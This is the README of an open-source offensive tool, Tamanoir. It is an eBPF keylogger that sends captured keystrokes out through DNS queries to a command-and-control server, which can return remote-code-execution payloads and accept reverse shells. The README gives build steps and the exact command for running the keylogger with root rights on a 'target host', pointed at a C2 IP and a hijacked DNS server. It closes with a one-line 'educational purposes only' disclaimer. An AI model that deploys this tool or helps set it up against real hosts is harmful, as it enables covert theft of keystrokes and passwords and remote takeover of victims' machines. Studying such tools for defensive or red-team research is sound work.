<div align="center">
  <h1>Tamanoir</h1>
  <h3>An eBPF🐝 Keylogger with <br>C2-based RCE payload delivery</h3>
  <img src="https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79" style="width: 30%; height: auto;">
  <p><small><i>A large anteater of Central and South America, Myrmecophaga tridactyla</i></small></p>
</div>

## 💡Overview

Tamanoir is composed of 3 components: 

### 1. Tamanoir
An eBPF program running on a target host, it will act as a keylogger and extract keystrokes via DNS queries.<br> 
In DNS response, attacker can choose to send chunks of RCE payload that will be executed on targeted host.

### 2. Tamanoir-C2
The C2(Command & Control) server. It acts as a DNS proxy and can inject rce payloads in DNS response.<br> 
It also can handle reverse shell connections.

### 3. Tamanoir-tui
The TUI client communicating with C2 server. Built on top of ratatui

#### ⚡ Powered by [aya](https://aya-rs.dev),  [tonic](https://github.com/hyperium/tonic), [tokio](https://github.com/tokio-rs/tokio) and [ratatui](https://ratatui.rs)


### Glossary
- what is [eBPF](https://ebpf.io/what-is-ebpf/)
- C2: Command and Control
- RCE: Remote Code Execution


### Documentation
Jump to:
- [Focus on Tamanoir (eBPF)](assets/doc/tamanoir.md)
- [Focus on Tamanoir-C2](assets/doc/tamanoir-c2.md)
- [Focus on Tamanoir-Tui  ](assets/doc/tamanoir-tui.md)
<br>

## Architecture
<div align="center">
  <img src="https://github.com/user-attachments/assets/06f104d0-3b07-43ec-834e-2043009c1f6c" style="width:75%">
</div>



## 🚀 Setup

You need a Linux based OS.

### ⚒️ Build from source

To build from source, make sure you have:

- [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
- [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.
- protobuf-compiler

#### 1. Build ebpf program

```
cd tamanoir-ebpf && cargo build --release
```

#### 2. Build user space program

```
cargo build -p tamanoir --release
```

#### 3. Build C2 Server

```
cargo build -p tamanoir-c2 --release
```

#### 4. Build Ratatui Client

```
cargo build -p tamanoir-tui --release
```

These commands will produce  `tamanoir`, `tamanoir-c2` and `tamanoir-tui` executables  in `target/release` that you can add to your`$PATH`

### 📥 Binary release

You can download the pre-built binaries from the [release page](https://github.com/adgaultier/tamanoir/releases)

<br>

## 🪄 Usage

### Tamanoir
🖥️ on target host:
```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip <C2 server IP> \
              --hijack-ip <locally configured DNS server IP> \
              --iface <network interface name>
```

for example:

```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip 192.168.1.15 \
              --hijack-ip 8.8.8.8 \
              --iface wlan0
```



<br>

### C2 Server
🖥️ on your C2 server host:

```
sudo tamanoir-c2 start
```
> [!NOTE]
> Make sure port 53 is available

<br>

### Tui Client
🖥️ wherever you want to use the client:


```
tamanoir-tui -i  <C2 server IP> 
```
> [!NOTE]
> Make sure C2 server is reachable on port 50051

<br>





## ⚠️ Disclaimer

`Tamanoir` is developed for educational purposes only

<br>



## ✍️ Authors

[Adrien Gaultier](https://github.com/adgaultier)
[Badr Badri](https://github.com/pythops)

<br>

## ⚖️ License

GPLv3
